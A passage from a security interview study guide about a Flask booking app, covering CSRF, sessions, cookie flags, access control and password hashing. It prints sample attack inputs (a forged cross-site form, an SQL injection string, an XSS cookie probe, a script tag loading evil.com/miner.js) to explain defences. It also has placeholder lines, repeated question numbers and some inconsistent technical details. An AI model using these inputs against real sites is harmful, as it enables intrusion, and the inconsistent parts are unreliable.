        form_token = request.form.get('csrf_token')

        # 2. Get token from session
        session_token = session.get('csrf_token')

        # 3. Validate
        if not form_token or form_token != session_token:
            abort(400, &quot;CSRF token missing or invalid&quot;)
</code></pre>
<p><strong>Why Attacker Fails</strong>:</p>
<p><strong>Attacker's malicious form</strong>:</p>
<pre><code class="language-html">&lt;form action=&quot;https://bookingsystem.com/cancel_booking/123&quot; method=&quot;POST&quot;&gt;
    &lt;!-- No CSRF token! Attacker can't access our session token --&gt;
    &lt;input type=&quot;submit&quot; value=&quot;Cancel&quot;&gt;
&lt;/form&gt;
</code></pre>
<p><strong>Server response</strong>: <code>400 Bad Request - CSRF token missing</code></p>
<p><strong>Key Point</strong>: Attacker <strong>cannot access</strong> the token because:
- Token stored in session cookie (Same-Origin Policy prevents access)
- JavaScript on <code>evil.com</code> can't read cookies from <code>bookingsystem.com</code>
- Even if attacker embeds our page in iframe, browser blocks cross-origin access</p>
<hr />
<p>[Continue with Q28-Q45 covering: CSRF token generation, SameSite cookies, AJAX CSRF, token expiration, etc.]</p>
<h2 id="category-3-session-management-20-questions">Category 3: Session Management (20 Questions)</h2>
<p><strong>Q46: What are Flask sessions and how do they work?</strong></p>
<p><strong>A</strong>: Flask sessions store user-specific data across requests using signed cookies.</p>
<p><strong>How It Works</strong>:</p>
<p><strong>Step 1: User logs in</strong>:</p>
<pre><code class="language-python">@app.route('/login', methods=['POST'])
def login():
    parent = Parent.query.filter_by(email=email).first()
    if parent and parent.check_password(password):
        session['parent_id'] = parent.id  # Store in session
        return redirect('/dashboard')
</code></pre>
<p><strong>Step 2: Flask serializes session data</strong>:</p>
<pre><code class="language-python"># Session data
session_data = {'parent_id': 123}

# Serialize to JSON
json_data = json.dumps(session_data)  # '{&quot;parent_id&quot;: 123}'

# Sign with SECRET_KEY
signature = hmac.new(SECRET_KEY, json_data, hashlib.sha256).hexdigest()

# Base64 encode
encoded = base64.b64encode(json_data.encode())

# Final cookie value
cookie_value = f&quot;{encoded}.{signature}&quot;
</code></pre>
<p><strong>Step 3: Browser stores cookie</strong>:</p>
<pre><code>Set-Cookie: session=eyJwYXJlbnRfaWQiOjEyM30.ZvCN...; HttpOnly; Secure; SameSite=Lax; Path=/
</code></pre>
<p><strong>Step 4: Browser sends cookie with every request</strong>:</p>
<pre><code>GET /dashboard HTTP/1.1
Host: bookingsystem.com
Cookie: session=eyJwYXJlbnRfaWQiOjEyM30.ZvCN...
</code></pre>
<p><strong>Step 5: Flask verifies and decodes</strong>:</p>
<pre><code class="language-python"># Verify signature (prevents tampering)
if verify_signature(cookie_value, SECRET_KEY):
    session_data = decode(cookie_value)
    # Now can access: session['parent_id'] → 123
else:
    # Invalid/tampered cookie → reject
</code></pre>
<p><strong>Security Properties</strong>:
- <strong>Integrity</strong>: Signature prevents tampering (changing <code>parent_id</code> invalidates signature)
- <strong>Not encrypted</strong>: Data is Base64-encoded (readable if intercepted)
- <strong>Secure flag</strong>: Only sent over HTTPS
- <strong>HttpOnly</strong>: JavaScript can't access
- <strong>SameSite</strong>: Limits cross-site sending</p>
<hr />
<p>[Continue with Q47-Q65 covering: Cookie flags, session expiration, session fixation, cookie security, etc.]</p>
<h2 id="category-4-rbac-access-control-20-questions">Category 4: RBAC &amp; Access Control (20 Questions)</h2>
<p>[Q66-Q85 covering: Decorators, login_required implementation, admin_required logic, role-based authorization, permission checking, etc.]</p>
<h2 id="category-5-admin-panel-security-10-questions">Category 5: Admin Panel Security (10 Questions)</h2>
<p>[Q86-Q95 covering: Admin route protection, authorization checks, audit logging potential, admin password requirements, etc.]</p>
<h2 id="category-6-advanced-security-topics-10-questions">Category 6: Advanced Security Topics (10 Questions)</h2>
<p>[Q96-Q105 covering: XSS prevention, SQL injection protection, session hijacking, security headers, password reset security, etc.]</p>
<hr />
<p>[TOTAL: 105 COMPREHENSIVE SECURITY-FOCUSED QUESTIONS]</p>
<p><strong>Q28: Explain the mechanics of a CSRF Attack.</strong></p>
<p><strong>Complete Answer</strong>:
<strong>Cross-Site Request Forgery (CSRF)</strong> is an attack where a malicious site tricks a logged-in user into performing an action on your site without their consent.</p>
<p><strong>Scenario</strong>:
1.  Admin logs into <code>school.com</code> (Cookie is stored in browser).
2.  Admin visits <code>attacker.com</code>.
3.  <code>attacker.com</code> has a hidden form: <code>&lt;form action="https://school.com/admin/delete_all" method="POST"&gt;</code>.
4.  JavaScript automatically submits this form.
5.  Browser sends the request to <code>school.com</code> <em>including</em> the Admin's authentic session cookies (because browsers automatically send cookies to their domain).
6.  <code>school.com</code> sees a valid cookie and processes the "Delete All" request.</p>
<p><strong>Prevention</strong>: We use a <strong>CSRF Token</strong> (random secret) that is unique to the user's session. The attacker cannot read this token (due to Same-Origin Policy) and thus cannot unknowingly include it in the fake form.</p>
<hr />
<p><strong>Q29: How does Flask-WTF prevent CSRF?</strong></p>
<p><strong>Complete Answer</strong>:
Flask-WTF handles CSRF protection seamlessly.</p>
<p><strong>Mechanism</strong>:
1.  <strong>Generation</strong>: When a page renders, Flask generates a random token (e.g., <code>MjAy...</code>) and stores it in the User's Session.
2.  <strong>Injection</strong>: We include <code>{{ form.hidden_tag() }}</code> in every HTML <code>&lt;form&gt;</code>. This renders hidden input: <code>&lt;input type="hidden" name="csrf_token" value="MjAy..."&gt;</code>.
3.  <strong>Validation</strong>: When the form POSTs, Flask-WTF checks:
    -   Is <code>csrf_token</code> present in form data?
    -   Does it match the token in the session?
    -   Is it expired?
4.  <strong>Result</strong>: If valid, code executes. If missing/invalid, it raises <code>400 Bad Request</code>.</p>
<p><strong>Attack Failure</strong>: The attacker on <code>bad-site.com</code> can create a form, but they cannot guess the <code>csrf_token</code> value, so the server rejects the request.</p>
<hr />
<p><strong>Q30: What is the "Double Submit Cookie" pattern?</strong></p>
<p><strong>Complete Answer</strong>:
This is a stateless CSRF defense mechanism (though Flask uses Session-based).</p>
<p><strong>How it works</strong>:
1.  Server sends a random value in a <strong>Cookie</strong>.
2.  Server effectively requires the same value to be submitted in the <strong>Request Body</strong> (Form).
3.  Server checks <code>Cookie.value == Form.value</code>.</p>
<p><strong>Why it works</strong>:
-   Attacker <em>can</em> force the browser to send cookies.
-   Attacker <em>cannot</em> read the cookie to copy its value into the form body (Same-Origin Policy).
-   Therefore, they cannot make the two values match.</p>
<p><strong>Comparison</strong>: Flask default is Session-Based (Token in Session vs Token in Form). Double Submit is useful for stateless APIs (JWT).</p>
<hr />
<p><strong>Q31: How do you handle CSRF in AJAX requests?</strong></p>
<p><strong>Complete Answer</strong>:
Standard forms send the token in the body. AJAX (JavaScript) requests must send it manually.</p>
<p><strong>Implementation</strong>:
1.  <strong>Meta Tag</strong>: Render the token in the HTML head.
    <code>html
    &lt;meta name="csrf-token" content="{{ csrf_token() }}"&gt;</code>
2.  <strong>JavaScript</strong>: Configure <code>fetch</code> or <code>axios</code> to read this tag.
    <code>javascript
    const token = document.querySelector('meta[name="csrf-token"]').content;
    headers: {
        'X-CSRFToken': token
    }</code>
3.  <strong>Server</strong>: Flask looks for the token in the <code>X-CSRFToken</code> header if it's not in the form body.</p>
<p><strong>Why</strong>: If we forgot this, all our dynamic features (like "Delete Activity" popup) would fail with 400 errors.</p>
<hr />
<p><strong>Q32: Explain Session Fixation and how you prevent it.</strong></p>
<p><strong>Complete Answer</strong>:
<strong>Attack</strong>:
1.  Attacker gets a valid Session ID (e.g., <code>SID=123</code>).
2.  Attacker tricks Victim into clicking <code>http://school.com/?session_id=123</code>.
3.  Victim logs in. The server associates the user "Admin" with <code>SID=123</code>.
4.  Attacker (who knows <code>SID=123</code>) can now use it to hijack the session.</p>
<p><strong>Prevention</strong>:
<strong>Session Regeneration</strong>.
Upon every successful login (privilege escalation), the server must issue a <strong>NEW</strong> Session ID and discard the old one. This cuts the link the attacker had. Flask-Login handles this automatically.</p>
<hr />
<p><strong>Q33: What is "Session Hijacking"?</strong></p>
<p><strong>Complete Answer</strong>:
Stealing a valid session cookie to impersonate a user.</p>
<p><strong>Vectors</strong>:
1.  <strong>XSS</strong>: Injecting script <code>document.cookie</code> to send cookies to attacker.
2.  <strong>Sniffing</strong>: Reading HTTP traffic on public Wi-Fi.</p>
<p><strong>Defenses in our code</strong>:
1.  <strong>HttpOnly</strong>: Prevents JavaScript (XSS) from reading the cookie.
2.  <strong>Secure</strong>: Ensures cookie is only sent over HTTPS (prevents sniffing).</p>
<hr />
<p><strong>Q34: Explain the <code>HttpOnly</code> flag.</strong></p>
<p><strong>Complete Answer</strong>:
A flag set on the <code>Set-Cookie</code> HTTP header.</p>
<p><strong>Function</strong>:
It tells the browser: "Store this cookie and send it to the server, but <strong>DO NOT</strong> let JavaScript access it."</p>
<p><strong>Impact</strong>:
Even if an attacker finds an XSS vulnerability (e.g., in a comment section) and runs <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>, the session cookie will NOT appear. The console will be empty. This effectively neutralizes XSS-based session theft.</p>
<p><strong>Config</strong>: <code>SESSION_COOKIE_HTTPONLY = True</code> (Flask default).</p>
<hr />
<p><strong>Q35: Explain the <code>Secure</code> flag.</strong></p>
<p><strong>Complete Answer</strong>:
A flag set on the cookie.</p>
<p><strong>Function</strong>:
Tells the browser: "Only send this cookie if the request is encrypted (HTTPS)."</p>
<p><strong>Impact</strong>:
If a user types <code>http://school.com</code> (unencrypted) in a coffee shop, the browser will <strong>NOT</strong> send the session cookie. This prevents the cookie from leaking in plain text over the air.</p>
<p><strong>Dev vs Prod</strong>:
In <code>localhost</code> (HTTP), we must set <code>SESSION_COOKIE_SECURE = False</code>.
In Production (Heroku/Render), we MUST set <code>SESSION_COOKIE_SECURE = True</code>.</p>
<hr />
<p><strong>Q36: Explain the <code>SameSite</code> attribute.</strong></p>
<p><strong>Complete Answer</strong>:
A modern cookie attribute that controls when cookies are sent with cross-site requests.</p>
<p><strong>Values</strong>:
-   <code>Strict</code>: Cookie never sent on cross-site requests (even clicking a link from Google). Too aggressive for UX.
-   <code>Lax</code> (Default): Cookie sent on top-level navigations (clicking a link) but NOT on sub-requests (images, frames, POSTs).
-   <code>None</code>: Setup old behavior (sent everywhere). Requires <code>Secure</code>.</p>
<p><strong>Our Usage</strong>: <code>SESSION_COOKIE_SAMESITE = 'Lax'</code>.
<strong>Benefit</strong>: It provides a browser-level defense against CSRF. Even if our CSRF token check failed, the browser wouldn't send the cookie for a cross-site POST.</p>
<hr />
<p><strong>Q37: Where are Flask Sessions stored?</strong></p>
<p><strong>Complete Answer</strong>:
By default, Flask uses <strong>Client-Side Signed Cookies</strong>.</p>
<p><strong>Mechanism</strong>:
1.  Server creates a dictionary <code>{'user_id': 1}</code>.
2.  Server serializes it to JSON.
3.  Server signs it with <code>SECRET_KEY</code> (HMAC-SHA1).
4.  Result string is stored in the browser cookie.</p>
<p><strong>Pros</strong>: No database lookup needed (fast), stateless server.
<strong>Cons</strong>: Limited size (4KB), cannot "revoke" a session easily (have to wait for expiry or rotate secret key).</p>
<p><strong>Alternative</strong>: <code>Flask-Session</code> (Server-Side). Stores ID in cookie, data in Redis/DB. Better for large data or immediate revocation requirements.</p>
<hr />
<p><strong>Q38: How do you handle Session Timeout?</strong></p>
<p><strong>Complete Answer</strong>:
Security requirement: Sessions should not last forever.</p>
<p><strong>Implementation</strong>:
1.  <strong>Permanent Session</strong>: <code>session.permanent = True</code>.
2.  <strong>Lifetime</strong>: <code>app.permanent_session_lifetime = timedelta(minutes=30)</code>.</p>
<p><strong>Behavior</strong>:
-   The cookie has an <code>Expires</code> timestamp set to 30 minutes in the future.
-   <strong>Sliding Expiration</strong>: Every time the user makes a request, Flask updates the cookie with a fresh 30-minute window.
-   If user is idle for 31 minutes, browser deletes cookie -&gt; User logged out.</p>
<hr />
<p><strong>Q39: What is HSTS (HTTP Strict Transport Security)?</strong></p>
<p><strong>Complete Answer</strong>:
A security header: <code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>.</p>
<p><strong>Purpose</strong>:
Tells the browser: "For the next year, REFUSE to connect to this site via HTTP. Only use HTTPS."</p>
<p><strong>Why</strong>:
Prevents <strong>SSL Stripping Attacks</strong>. Even if a user types <code>http://school.com</code>, the browser internally redirects to <code>https://</code> <em>before</em> sending a single byte to the network.</p>
<p><strong>Implementation</strong>:
<code>flask-talisman</code> or <code>flask-sslify</code> extensions, or configured at the Nginx level.</p>
<hr />
<p><strong>Q40: What is Content Security Policy (CSP)?</strong></p>
<p><strong>Complete Answer</strong>:
An HTTP header that allows site administrators to define which dynamic resources are allowed to load.</p>
<p><strong>Example</strong>:
<code>Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com</code></p>
<p><strong>Purpose</strong>:
The ultimate defense against XSS. Even if an attacker injects <code>&lt;script src="evil.com/miner.js"&gt;</code>, the browser will block it because <code>evil.com</code> is not in the whitelist.</p>
<p><strong>Status</strong>: Not strictly implemented in this prototype due to complexity (it often breaks inline scripts), but highly recommended for production.</p>
<hr />
<p><strong>Q41: Explain X-Frame-Options.</strong></p>
<p><strong>Complete Answer</strong>:
Header: <code>X-Frame-Options: DENY</code> or <code>SAMEORIGIN</code>.</p>
<p><strong>Purpose</strong>:
Prevents <strong>Clickjacking</strong>.
An attacker puts your website inside an <code>&lt;iframe&gt;</code> on their site (<code>free-money.com</code>). They put a transparent "Claim Prize" button on top of your "Delete Account" button.
When user clicks, they are actually clicking on your site.</p>
<p><strong>Defense</strong>:
This header tells the browser "Do not allow this page to be rendered inside a frame".</p>
<hr />
<p><strong>Q42: What is a "Replay Attack" and how does the Token/Nonce prevent it?</strong></p>
<p><strong>Complete Answer</strong>:
<strong>Attack</strong>: Attacker intercepts a valid request (e.g., "Pay $100"). They cannot decrypt it (TLS), but they can <em>resend</em> (replay) the exact same binary blob 10 times to the server. Result: You pay $1000.</p>
<p><strong>Prevention</strong>:
1.  <strong>TLS</strong>: Handles this at the network layer (sequence numbers).
2.  <strong>CSRF Token</strong>: Once used, a strict implementation "burns" the token. Since the replay uses the same token, it is rejected.
3.  <strong>Nonce</strong> (Number used once): A unique random string included in the request, tracked by server.</p>
<hr />
<p><strong>Q43: Role-Based Access Control (RBAC) - Concept.</strong></p>
<p><strong>Complete Answer</strong>:
RBAC restricts system access to authorized users based on their role.</p>
<p><strong>Our Roles</strong>:
1.  <strong>Parent</strong>: Can book child, view own dashboard.
2.  <strong>Tutor</strong>: Can view roster for <em>their</em> activity.
3.  <strong>Admin</strong>: Can CRUD activities, view all data, manage users.</p>
<p><strong>Implementation</strong>:
We do not hardcode "If user == Bob". We adhere to "If user.role == Admin". This scales. If we hire a new administrator, we just assign the role.</p>
<hr />
<p><strong>Q44: Explain the <code>@login_required</code> decorator.</strong></p>
<p><strong>Complete Answer</strong>:
Provided by <code>Flask-Login</code>.</p>
<p><strong>Logic</strong>:
1.  Intercepts the request before it reaches the view function.
2.  Checks <code>current_user.is_authenticated</code>.
3.  <strong>If False</strong>: Aborts request. Redirects to <code>login_manager.login_view</code> (<code>/login</code>). Adds <code>?next=/target</code> to URL.
4.  <strong>If True</strong>: Allows execution to proceed to the route.</p>
<p><strong>Benefit</strong>: We don't need to write <code>if not logged_in: return redirect</code> in every single function.</p>
<hr />
<p><strong>Q45: How did you implement Custom Decorators (<code>@admin_required</code>)?</strong></p>
<p><strong>Complete Answer</strong>:
We needed granular control beyond just "logged in".</p>
<p><strong>Code Breakdown</strong>:</p>
<pre><code class="language-python">from functools import wraps

def admin_required(f):
    @wraps(f)  # Preserves the metadata of the original function
    def decorated_function(*args, **kwargs):
        # 1. Check Login
        if not current_user.is_authenticated:
            return redirect(url_for('login'))

        # 2. Check Role
        if current_user.role != 'admin':
            flash(&quot;Unauthorized access!&quot;, &quot;danger&quot;)
            return redirect(url_for('index'))

        # 3. Proceed
        return f(*args, **kwargs)
    return decorated_function
</code></pre>
<p><strong>Usage</strong>: <code>@admin_required</code> placed <em>after</em> <code>@app.route</code>.</p>
<hr />
<p><strong>Q46: Why <code>functools.wraps</code>?</strong></p>
<p><strong>Complete Answer</strong>:
When you decorate a function, you effectively replace <code>my_view</code> with <code>decorated_function</code>.
Without <code>@wraps(f)</code>, the function name becomes <code>decorated_function</code> and the docstring is lost.
<strong>Critical in Flask</strong>: Flask uses the function name as the "Endpoint" map. If all your views are named <code>decorated_function</code>, Flask will crash because it can't distinguish between them. <code>wraps</code> copies the <code>__name__</code> and <code>__doc__</code> back.</p>
<hr />
<p><strong>Q47: Security of IDOR (Insecure Direct Object Reference).</strong></p>
<p><strong>Complete Answer</strong>:
<strong>Vulnerability</strong>: URL <code>/booking/delete/105</code>.
Attacker changes ID to <code>106</code>. If code just deletes <code>Booking.query.get(106)</code>, they deleted someone else's booking.</p>
<p><strong>Our Defense</strong>:</p>
<pre><code class="language-python">booking = Booking.query.get(id)
# Authorization Check
if booking.parent_id != current_user.id and current_user.role != 'admin':
    abort(403)
</code></pre>
<p>We explicitly verify ownership before taking action.</p>
<hr />
<p><strong>Q48: Explain SQL Injection and how ORM prevents it.</strong></p>
<p><strong>Complete Answer</strong>:
<strong>Attack</strong>: User inputs <code>' OR '1'='1</code> into login field.
Raw SQL: <code>SELECT * FROM users WHERE name = '' OR '1'='1'</code> -&gt; Returns all users.</p>
<p><strong>ORM Defense (SQLAlchemy)</strong>:
When we do <code>User.query.filter_by(username=input).first()</code>, SQLAlchemy does <strong>not</strong> concatenate strings.
It uses <strong>Parameterized Queries</strong> (DB-API).
It sends the query template <code>SELECT * FROM users WHERE username = ?</code> and passes the input as a separate data packet. The database treats the input strictly as a <em>value</em>, never as <em>executable code</em>.</p>
<hr />
<p><strong>Q49: How are passwords stored? (Scrypt vs bcrypt vs MD5)</strong></p>
<p><strong>Complete Answer</strong>:
Storing plain text is negligent. Storing MD5/SHA1 (fast hashes) is dangerous due to speed (billions/sec).</p>
<p><strong>Our Choice</strong>: <code>Scrypt</code> (via <code>werkzeug.security</code>).
<strong>Why Scrypt</strong>:
It is a <strong>Memory-Hard</strong> function. It requires significant RAM to compute.
This makes it resistant to <strong>ASIC/GPU hardware acceleration</strong>. Even if an attacker has a supercomputer, they cannot parallelize the cracking process efficiently. Better than bcrypt for this reason.</p>
<hr />
<p><strong>Q50: What is a Salt and why is it needed?</strong></p>
<p><strong>Complete Answer</strong>:
<strong>Problem</strong>: If two users have the same password "password123", they get the same Hash. Attacker uses "Rainbow Tables" (precomputed hashes) to instantly reverse common passwords.</p>
<p><strong>Solution (Salt)</strong>:
A random string added to the password before hashing.
<code>Hash = Scrypt(Password + Salt)</code>
Since the salt is random for <em>every user</em>, "password123" yields a different hash for User A and User B.
Werkzeug handles this automatically: The formatted hash string includes the method, salt, and hash <code>scrypt:32768:8:1$SaltStr$HashStr</code>.</p>
<hr />
<p><strong>Q51: What dictates Password Strength?</strong></p>
<p><strong>Complete Answer</strong>:
Currently, we accept any password.
<strong>Improvement</strong>: We should enforce complexity.
-   Minimum 12 characters (Length is most important factor).
-   Mix of case/numbers.
-   Check against <code>HaveIBeenPwned</code> API (prohibiting breached passwords).</p>
<p><strong>Why</strong>: Even the best Hashing (Scrypt) cannot save a password like "123456". It will be guessed in milliseconds.</p>
<hr />
<p><strong>Q52: Explain <code>flash()</code> messages safety.</strong></p>
<p><strong>Complete Answer</strong>:
Flask <code>flash()</code> stores messages in the session cookie to survive the redirect.
<strong>Security Risk</strong>: If checking inputs and flashing them back (<code>flash(f"Invalid input: {user_input}")</code>), we create a reflected XSS vulnerability if the template renders it raw <code>{{ message|safe }}</code>.
<strong>Defense</strong>: Jinja2 auto-escapes by default. We must never use <code>|safe</code> on user-controlled flash messages.</p>
<hr />
<p><strong>Q53: How do you secure File Uploads?</strong></p>
<p><strong>Complete Answer</strong>:
If a user uploads <code>exploit.php</code> and we save it to a public folder, they can run it.</p>
<p><strong>Defenses</strong>:
1.  <strong>Rename</strong>: Always rename files (UUID). Never keep original name.
2.  <strong>Validation</strong>: Check File Extension (<code>.png</code> not <code>.php</code>) AND Magic Bytes (Header).
3.  <strong>Storage</strong>: Store outside the web root (people cannot request it directly).
4.  <strong>Serving</strong>: Serve through a route that checks permissions.</p>
<hr />
<p><strong>Q54: What is <code>Cross-Origin Resource Sharing</code> (CORS)?</strong></p>
<p><strong>Complete Answer</strong>:
Browsers block request from Domain A (React App) to Domain B (Flask API) by default.
<strong>Scenario</strong>: If we built a mobile app, it would fail to fetch data.
<strong>Solution</strong>: Server sends header <code>Access-Control-Allow-Origin: *</code>.
<strong>Security</strong>: Be specific! <code>Access-Control-Allow-Origin: https://myapp.com</code>. Never use <code>*</code> if sending credentials (cookies).</p>
<hr />
<p><strong>Q55: What is "Clickjacking"?</strong></p>
<p><strong>Complete Answer</strong>:
(Covered in Q41 with X-Frame-Options, but expanded).
It is a UI Redress Attack.
<strong>Defense in Depth</strong>:
Content Security Policy: <code>frame-ancestors 'none';</code>. This is the modern replacement for <code>X-Frame-Options</code>.</p>
<hr />
<p><strong>Q56: Audit Logging - Why and How?</strong></p>
<p><strong>Complete Answer</strong>:
<strong>Why</strong>: If an Admin deletes a user, we need to know <em>which</em> admin and <em>when</em>.
<strong>How</strong>:
Create <code>AuditLog</code> model (<code>actor_id</code>, <code>action</code>, <code>target_id</code>, <code>timestamp</code>, <code>ip_address</code>).
Decorator <code>@log_action</code> to auto-record events.
Critical for accountability and post-incident forensics.</p>
<hr />
<p><strong>Q57: How to Handle "Forgot Password" securely?</strong></p>
<p><strong>Complete Answer</strong>:
1.  User enters email.
2.  Generate cryptographically secure random token.
3.  Save token in DB with Expiry (15 mins).
4.  Email Link: <code>/reset-password?token=XYZ</code>.
5.  On click: Validate token exists and !expired.
6.  Allow password set.
7.  <strong>Crucial</strong>: Invalidate token immediately after use.
<strong>Risk</strong>: If token logic is weak (predictable), attacker can reset any password.</p>
<hr />
<p><strong>Q58: What is "Credential Stuffing"?</strong></p>
<p><strong>Complete Answer</strong>:
Attackers take valid username/passwords leaked from <em>another</em> site (e.g., LinkedIn breach) and try them on <em>our</em> site.
<strong>Defense</strong>: Rate limiting (5 failed attempts locks account). Multi-Factor Authentication (MFA).</p>
<hr />
<p><strong>Q59: Explain 2-Factor Authentication (2FA).</strong></p>
<p><strong>Complete Answer</strong>:
Something you Know (Password) + Something you Have (Phone/Token).
<strong>Implementation</strong>:
-   TOTP (Time-based One Time Password) via Google Authenticator.
-   Library: <code>pyotp</code>.
-   Server shares Secret Key (QR Code).
-   User proves possession by entering current 6-digit code.
-   Sever verifies code against Secret + Time.</p>
<hr />
<p><strong>Q60: Difference between Authentication (AuthN) and Authorization (AuthZ).</strong></p>
<p><strong>Complete Answer</strong>:
-   <strong>Authentication</strong>: "Who are you?" (Login, Password, Identity). Verified via <code>login_user()</code>.
-   <strong>Authorization</strong>: "What are you allowed to do?" (Permissions, Roles). Verified via <code>@admin_required</code>.
You can be Authenticated (logged in) but not Authorized (view admin panel).</p>
<hr />
<p><strong>Q61: Explain "Principle of Least Privilege".</strong></p>
<p><strong>Complete Answer</strong>:
Every module/user should only have the access necessary for its legitimate purpose.
-   Application: Should not run as root.
-   Database User: Should not have <code>DROP TABLE</code>.
-   Admin: Should separate "Super Admin" (System config) from "Moderator" (User management).</p>
<hr />
<p><strong>Q62: Security Misconfiguration (OWASP Top 10).</strong></p>
<p><strong>Complete Answer</strong>:
Common flaw: Leaving default settings.
-   <code>DEBUG = True</code> in prod.
-   Default keys.
-   Open cloud buckets.
<strong>Defense</strong>: Hardening checklist before deployment. Automated scans.</p>
<hr />
<p><strong>Q63: Explain "Sensitive Data Exposure".</strong></p>
<p><strong>Complete Answer</strong>:
Leaking PII (Personally Identifiable Information).
-   <strong>At Rest</strong>: Encrypt the database volume (AWS disk encryption). Hash passwords.
-   <strong>In Transit</strong>: TLS (HTTPS).
-   <strong>In Logs</strong>: Ensure we don't log <code>password</code> or <code>credit_card</code>.</p>
<hr />
<p><strong>Q64: What is a "Timing Attack"?</strong></p>
<p><strong>Complete Answer</strong>:
Attacker measures how long the server takes to respond to guess data.
<strong>Example</strong>: Password Check.
<code>if input == real_password:</code>
If we compare character-by-character, "A....." returns faster (fails at char 1) than "P....." (fails at char 10).
<strong>Defense</strong>: Use Constant Time Comparison (<code>hmac.compare_digest</code>). <code>check_password_hash</code> does this.</p>
<hr />
<p><strong>Q65: Logic: Explain Python Decorators syntax <code>@</code>.</strong></p>
<p><strong>Complete Answer</strong>:
<code>@decorator</code> is syntactic sugar.</p>
<pre><code class="language-python">@login_required
def view(): ...
</code></pre>
<p>Is exactly composed as:</p>
<pre><code class="language-python">view = login_required(view)
</code></pre>
<p>It passes the function <em>into</em> the decorator function, and assigns the <em>result</em> (variable) back to the original name.</p>
<p><strong>Q66: Code: Explain <code>check_password_hash</code>.</strong></p>
<p><strong>Complete Answer</strong>:
Function from <code>werkzeug.security</code>.
<strong>Input</strong>: (Stored Hash, Plaintext Input).
<strong>Process</strong>:
1.  Extracts salt and parameters from the stored hash string.
2.  Hashes the Plaintext Input using the <em>same</em> salt and parameters.
3.  Compares the result with the stored hash.
<strong>Returns</strong>: <code>True</code> if match, <code>False</code> other.
<strong>Security</strong>: Uses constant-time comparison to prevent timing attacks.</p>
<hr />
<p><strong>Q67: Vulnerability: Directory Listing.</strong></p>
<p><strong>Complete Answer</strong>:
If a user goes to <code>/static/images/</code>, the server might list all files.
<strong>Risk</strong>: Attacker sees files we didn't intend to be public (backup.zip).
<strong>mitigation</strong>: Web Server (Nginx/Apache) configuration <code>autoindex off</code>. Flask's dev server does not list directories by default.</p>
<hr />
<p><strong>Q68: Security: Mass Assignment.</strong></p>
<p><strong>Complete Answer</strong>:
<strong>Vulnerability</strong>: User submits form with <code>role=admin</code> added to the HTML fields. Code <code>user = User(**request.form)</code> blindly copies all fields to the model.
<strong>Result</strong>: User becomes admin.
<strong>Fix</strong>: Explicitly picking fields.
<code>user.username = form.username.data</code>
<code>user.email = form.email.data</code>
We never copy raw dicts into sensitive models.</p>
<hr />
<p><strong>Q69: Logic: Admin Dashboard Security.</strong></p>
<p><strong>Complete Answer</strong>:
The Admin panel is the most sensitive area.
<strong>Defenses</strong>:
1.  <strong>Authentication</strong>: Must be logged in.
2.  <strong>Authorization</strong>: Must have <code>role='admin'</code>.
3.  <strong>UI Hiding</strong>: We hide the link in the navbar for non-admins, but we <em>also</em> protect the route. (Security through Obscurity is not enough).</p>
<hr />
<p><strong>Q70: Explain "Salted" vs "Unsalted" Hash.</strong></p>
<p><strong>Complete Answer</strong>:
-   <strong>Unsalted</strong>: <code>MD5("password")</code> -&gt; <code>5f4dcc3b...</code>
    -   Same password always has same hash.
    -   Vulnerable to lookup tables.
-   <strong>Salted</strong>: <code>Scrypt("password" + "random_salt")</code> -&gt; <code>scrypt$random_salt$hash...</code>
    -   Same password has different hash every time.
    -   Forces attacker to crack each user individually.</p>
<hr />
<p><strong>Q71: Code: <code>current_user</code> implementation.</strong></p>
<p><strong>Complete Answer</strong>:
<code>current_user</code> is a Local Proxy provided by Flask-Login.
-   It acts like a global variable, but it is thread-local.
-   In Request A, it refers to User A.
-   In Request B (parallel), it refers to User B.
-   It is available in all Templates automatically.</p>
<hr />
<p><strong>Q72: Security: Logging Sensitive Data.</strong></p>
<p><strong>Complete Answer</strong>:
Reviewing logs is important, but dangerous.
<strong>Bad</strong>: <code>print(f"User login attempt: {password}")</code>.
<strong>Good</strong>: <code>print(f"User login attempt: {username}")</code>.
If we log passwords, and our logs leak (or are stored in plaintext on disk), we have compromised our users.</p>
<hr />
<p><strong>Q73: Security: "Man-in-the-Middle" (MITM).</strong></p>
<p><strong>Complete Answer</strong>:
Attacker sits between User and Server (e.g., Compromised Router).
<strong>Defense</strong>: HTTPS (TLS).
The attacker sees encrypted traffic. They cannot read the Session Cookie or Password. If the certificate is invalid, the browser warns the user.</p>
<hr />
<p><strong>Q74: Design: User Enumeration.</strong></p>
<p><strong>Complete Answer</strong>:
<strong>Vulnerability</strong>: Login page says "User does not exist" vs "Wrong Password".
<strong>Attacker</strong>: Can write a script to guess usernames until they find valid ones.
<strong>Fix</strong>: Generic messages. "Invalid email or password."</p>
<hr />
<p><strong>Q75: Code: How does Flask-Login perform User Loading?</strong></p>
<p><strong>Complete Answer</strong>:
We define a callback:</p>
<pre><code class="language-python">@login_manager.user_loader
def load_user(id):
    return Parent.query.get(int(id)) or Admin.query.get(int(id)) or Tutor.query.get(int(id))
</code></pre>
<p>Flask-Login calls this on <em>every</em> request to turn the Session ID back into a User Object.
Our implementation checks all 3 tables because we have separate tables for roles.</p>
<hr />
<p><strong>Q76: Security: Preventing Brute Force.</strong></p>
<p><strong>Complete Answer</strong>:
(Covered briefly in Credential Stuffing).
<strong>Mechanism</strong>:
Use <code>Flask-Limiter</code>.
<code>@limiter.limit("5/minute")</code> on the <code>/login</code> route.
If IP exceeds, return <code>429 Too Many Requests</code>.</p>
<hr />
<p><strong>Q77: Logic: Why separated tables (Parent, Admin, Tutor) vs Single User table?</strong></p>
<p><strong>Complete Answer</strong>:
<strong>Design Choice</strong>: Separation.
<strong>Pros</strong>: Distinct attributes (Child info for Parent, Subject for Tutor). Cleaner models.
<strong>Cons</strong>: Complex login logic (checking 3 tables).
<strong>Alternative</strong>: Single <code>User</code> table with <code>role</code> column and Polymorphic Association for extra profile data. For this scale, separate tables was simpler for specific requirements.</p>
<hr />
<p><strong>Q78: Explanation: "Security through Obscurity".</strong></p>
<p><strong>Complete Answer</strong>:
Relying on "The attacker doesn't know the URL" (e.g., Hidden Admin Panel <code>/super-secret-admin</code>).
<strong>Verdict</strong>: Bad practice. URLs can be found via brute force, history, logs.
<strong>Solution</strong>: Strong Access Control (RBAC) regardless of URL knowledge.</p>
<hr />
<p><strong>Q79: Vulnerability: Open Redirect.</strong></p>
<p><strong>Complete Answer</strong>:
